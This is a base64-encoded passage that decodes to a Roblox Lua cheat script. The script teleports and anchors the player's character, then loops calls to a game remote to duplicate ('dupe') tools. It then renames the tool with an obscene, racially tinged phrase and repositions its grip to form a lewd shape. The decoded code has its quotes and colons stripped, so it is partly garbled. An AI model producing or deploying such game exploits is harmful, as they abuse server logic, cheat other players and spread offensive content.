UZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3YWl0KDAuMykKICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBtPTEsIDc2IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IFBpY2tpbmdUb29scywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHBpY2t0b29scmVtb3RlSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tXYWl0Rm9yQ2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHRoYXRpd2FudHRvZHVwZV1GaW5kRmlyc3RDaGlsZChIYW5kbGUpLk5hbWUgPSBI4iClYeIgpW7iIKVk4iClbOIgpWUKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrRmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgICAgICAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKSBlbmQgd2FpdCgpIHVudGlsIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpID09IG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgPT0gbmlsCiAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgICAgICAgICAgICAgdG9vbGdyaXAgPSB0cnVlCiAgICAgICAgICAgICAgICBkdXBpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgd2FpdCgxKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMS41LCAwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCAyKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCA2KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCA4KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCAtOCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgMCwgLTYpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIDAsIC00KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAwLCAtMikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTMsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTQsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTUsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTYsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTcsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTgsIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTksIC0xMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEwLCAtMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xMC41LCAtOSkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEwLjUsIC04KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAuNSwgLTYpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xMCwgLTUpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xMC41LCAtNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTExLjUsIC00KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTIuNSwgLTQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xMy41LCAtNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2N